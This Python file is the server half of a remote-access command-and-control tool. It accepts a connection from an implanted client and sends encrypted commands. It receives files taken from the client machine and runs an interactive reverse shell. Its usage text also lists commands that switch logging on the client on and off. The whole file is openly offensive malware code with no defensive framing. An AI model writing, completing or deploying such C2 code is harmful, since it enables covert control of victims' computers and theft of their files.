# -*- coding: utf-8 -*-
import logging
import os
import utils
import socket

class CommandAndControl:
    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 1005
        self.sock = socket.socket()

        self.file_path = "files"
        
        self.connect()

#--------------- SERVER METHODS ---------------#
    def connect(self):
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        self.conn, addr = self.sock.accept()
        logging.info(f"Got connection from {addr}")
        
    def close_connection(self):
        self.conn.close()
        
    def send_command_to_client(self, data: str):
        data = data.encode(utils.ENCODING)
        encrypted_data = utils.encrypt(data)
        self.conn.sendall(encrypted_data)
        
    def receive_from_client(self):
        try:
            recv = self.conn.recv(utils.BUFFSIZE)
            plainbytes = utils.decrypt(recv)
            return plainbytes
        except (socket.error, AttributeError) as err:
            logging.debug(err)
    
    def receive_file(self, header):
        receiving = True
        logging.info(f"Receiving {header['number_of_files_left']+1} Files from Client")
        
        while receiving:
            data = b""
            logging.info(f"Receiving File: {header['filename']} Number of Chunks: {header['number_of_chunks']}")

            for _ in range(header['number_of_chunks']):
                recv = self.receive_from_client()
                if recv:
                    data += recv

            self.write_file(data, header['filename'])
            logging.info(f"File received, {header['number_of_files_left']} files left")
            
            if header['number_of_files_left'] == 0:
                receiving = False
            else:
                recv = self.receive_from_client()
                if recv:
                    header = covert_header_to_dict(recv)
        
    def receive_message(self, header):
        msg = b""
        for _ in range(header["number_of_chunks"]):
            recv = command_and_control.receive_from_client()
            if recv:
                msg += recv
        return msg.decode(utils.ENCODING)
    
#--------------- CLI METHODS ---------------#
    def print_usage(self):
        logging.info("Usage:")
        logging.info("help:        Print this usage message")
        logging.info("activate:    Activate the logging")
        logging.info("deactivate:  Deactivate the logging")
        logging.info("send:        Send txt and png files to the server")
        logging.info("shell:       Activate reverse-shell. Enter \"exit\" to deactivate")
        logging.info("exit:        Terminate server, client will wait for reconnection")
        logging.info("stop:        Terminate client and server")

#--------------- FILE METHODS ---------------#
    def write_file(self, data:bytes, filename:str):
        if not os.path.exists(self.file_path):
            os.makedirs(self.file_path)
        with open(os.path.join(self.file_path, filename), "wb") as file:
            file.write(data)

#--------------- FUNCTIONS ---------------#
def covert_header_to_dict(header: bytes) -> dict:
    l = header.decode(utils.ENCODING).split("__")

    number_of_chunks = int(l[0]) if l[0] else None
    filename = l[1] if l[1] else None
    number_of_files_left = int(l[2]) if l[2] else None

    header = {"number_of_chunks":number_of_chunks, "filename":filename, "number_of_files_left":number_of_files_left}
    return header

#--------------- MAIN ---------------#    
if __name__ == "__main__":
    current_reverse_shell_dir = ""
    command_and_control = CommandAndControl()

    while True:
        if current_reverse_shell_dir:
            inpt = input(current_reverse_shell_dir+">")
        else:
            inpt = input("enter command:")
        if inpt:
            if inpt == "help":
                command_and_control.print_usage()
                
            elif inpt == "exit" and not current_reverse_shell_dir:
                logging.info("stopping server")
                break
            else:
                command_and_control.send_command_to_client(inpt)

                header_binary = command_and_control.receive_from_client()
                if header_binary:
                    header = covert_header_to_dict(header_binary)

                    if header["filename"]:
                        command_and_control.receive_file(header)
                    else:
                        msg = command_and_control.receive_message(header)
                        if msg == "stopped":
                            logging.info("stopped")
                            break
                        elif msg == "logging activated":
                            logging.info("logging activated")
                        elif msg == "logging deactivated":
                            logging.info("logging deactivated")
                        elif msg.startswith("current dir"):
                            current_reverse_shell_dir = msg[len("current dir"):]
                        elif msg == "revshell deactivated":
                            current_reverse_shell_dir = ""
                        elif msg == "unknown command":
                            logging.info(f"unknown command: {inpt}")
                        else:
                            logging.info(msg)

    command_and_control.close_connection()
    logging.info("good bye")
